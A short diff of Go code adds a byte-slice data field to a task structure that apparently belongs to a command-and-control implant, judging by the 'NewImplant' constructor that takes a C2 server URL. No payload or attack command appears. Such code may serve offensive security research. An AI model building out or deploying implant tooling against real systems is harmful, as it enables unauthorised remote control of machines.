@@ -30,6 +30,7 @@ type Task struct {
 	ImplantID string   `json:"implant_id"`
 	TaskType  string   `json:"task_type"`
 	Command   string   `json:"cmd"`
+	Data      []byte   `json:"data"`
 }
 
 func NewImplant(c2ServerURL string) *Implant {
